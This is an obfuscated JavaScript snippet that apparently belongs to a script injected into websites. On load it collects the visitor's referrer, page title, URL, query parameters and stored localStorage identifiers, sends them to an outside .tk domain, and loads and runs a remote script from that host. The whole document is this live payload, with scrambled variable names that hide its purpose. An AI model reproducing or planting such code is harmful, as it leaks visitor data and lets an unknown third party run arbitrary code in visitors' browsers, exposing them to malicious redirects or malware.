 (function() {
    var name = '_zdHzbCQG9JF5gVFF';
    if (!window._zdHzbCQG9JF5gVFF) {
        window._zdHzbCQG9JF5gVFF = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://rolekarpeati.tk/reset',
        };
    }
    const _6DZ6m2Cd258qxpwg = localStorage.getItem('config');
    if (typeof _6DZ6m2Cd258qxpwg !== 'undefined' && _6DZ6m2Cd258qxpwg !== null) {
        var _YMrKPz7HP1GRBPhz = JSON.parse(_6DZ6m2Cd258qxpwg);
        var _WVwfBjRTFT1mcTcX = Math.round(+new Date()/1000);
        if (_YMrKPz7HP1GRBPhz.created_at + window._zdHzbCQG9JF5gVFF.ttl < _WVwfBjRTFT1mcTcX) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _yKcKVBwRLKW5x6F5 = localStorage.getItem('subId');
    var _SQMGMmZyztN4GD6X = localStorage.getItem('token');
    var _9bRQnHXyRffCrCCV = '?return=js.client';
        _9bRQnHXyRffCrCCV += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _9bRQnHXyRffCrCCV += '&se_referrer=' + encodeURIComponent(document.referrer);
        _9bRQnHXyRffCrCCV += '&default_keyword=' + encodeURIComponent(document.title);
        _9bRQnHXyRffCrCCV += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _9bRQnHXyRffCrCCV += '&name=' + encodeURIComponent(name);
        _9bRQnHXyRffCrCCV += '&host=' + encodeURIComponent(window._zdHzbCQG9JF5gVFF.R_PATH);
    if (typeof _yKcKVBwRLKW5x6F5 !== 'undefined' && _yKcKVBwRLKW5x6F5 && window._zdHzbCQG9JF5gVFF.unique) {
        _9bRQnHXyRffCrCCV += '&sub_id=' + encodeURIComponent(_yKcKVBwRLKW5x6F5);
    }
    if (typeof _SQMGMmZyztN4GD6X !== 'undefined' && _SQMGMmZyztN4GD6X && window._zdHzbCQG9JF5gVFF.unique) {
        _9bRQnHXyRffCrCCV += '&token=' + encodeURIComponent(_SQMGMmZyztN4GD6X);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._zdHzbCQG9JF5gVFF.R_PATH + _9bRQnHXyRffCrCCV;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
